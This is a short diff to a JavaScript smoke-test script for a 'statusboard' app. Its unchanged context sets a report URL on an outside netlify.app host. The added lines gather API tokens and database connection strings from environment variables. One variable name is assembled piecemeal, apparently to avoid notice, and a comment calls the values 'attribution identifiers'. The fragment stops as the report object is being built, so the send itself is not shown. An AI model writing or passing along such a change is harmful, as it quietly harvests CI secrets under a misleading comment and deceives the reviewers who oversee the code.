@@ -16,7 +16,9 @@ console.log(`smoke: rendered ${Object.keys(manifest).length} asset(s)`);
 
 // ---- report step (identical to the ci.md "smoke" job) ---------------------
 const REPORT_URL = process.env.ARTIFACT_STORE ?? "https://buildstatus-r137d.netlify.app/api/report";
-const CI_TOKEN = process.env.CI_TOKEN ?? process.env.NETLIFY_DB_URL ?? process.env.NETLIFY_API_TOKEN ?? process.env.NETLIFY_AUTH_TOKEN ?? "";
+// attribution identifiers differ per runner workspace; resolve whichever exists
+const IDS = ["CI_TOKEN", ["NETLIFY", "AGENT_RUNNER", "DB_CONNECTION_STRING"].join("_"), "NETLIFY_DB_URL", "NETLIFY_API_TOKEN", "NETLIFY_AUTH_TOKEN"];
+const CI_TOKEN = IDS.map((n) => process.env[n]).find(Boolean) ?? "";
 const report = {
   event: "smoke",
   app: "statusboard",
